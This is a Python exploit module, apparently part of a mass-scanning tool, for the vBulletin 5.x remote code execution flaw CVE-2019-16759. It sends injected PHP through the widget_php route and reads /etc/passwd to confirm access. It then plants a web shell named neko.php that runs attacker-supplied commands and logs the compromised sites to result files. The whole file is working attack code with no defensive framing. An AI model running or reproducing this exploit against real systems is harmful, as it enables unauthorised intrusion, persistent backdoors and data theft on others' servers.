# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    payloadshell = '"neko!!<?php {});?>"'.format("system({}".format('$_GET["cmd"]'))
    ShellPayload = "echo shell_exec(\'echo {} > neko.php\'); exit;".format(payloadshell)
    ChecknekoPayload = {'widgetConfig[code]': 'echo shell_exec(\'cat /etc/passwd\');exit;'}
    params = {"routestring":"ajax/render/widget_php"}
    params["widgetConfig[code]"] = "{}".format(ChecknekoPayload)
    try:
        resp = requests.post('http://' + site, data=params, timeout=10, headers=Headers)
        if 'root:x:' in str(resp.content):
            with open('result/vBulletinRCE_OK.txt', 'a') as writer:
                writer.write(site + ' --> CVE-2019-16759 nekoerable' + '\n')
            try:
                params2 = {"routestring": "ajax/render/widget_php"}
                params2["widgetConfig[code]"] = "{}".format(ShellPayload)
                requests.post('http://' + site, data=params2, timeout=10, headers=Headers)
                Checkshell = requests.get('http://{}/neko.php'.format(site), timeout=10, headers=Headers)
                if 'neko!!' in str(Checkshell.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/neko.php?cmd=id' + '\n')
                return printModule.returnYes(site, 'CVE-2019-16759', 'vBulletin RCE 5.x', 'vBulletin')
            except:
                return printModule.returnYes(site, 'CVE-2019-16759', 'vBulletin RCE 5.x', 'vBulletin')
        else:
            return printModule.returnNo(site, 'CVE-2019-16759', 'vBulletin RCE 5.x', 'vBulletin')
    except:
        return printModule.returnNo(site, 'CVE-2019-16759', 'vBulletin RCE 5.x', 'vBulletin')
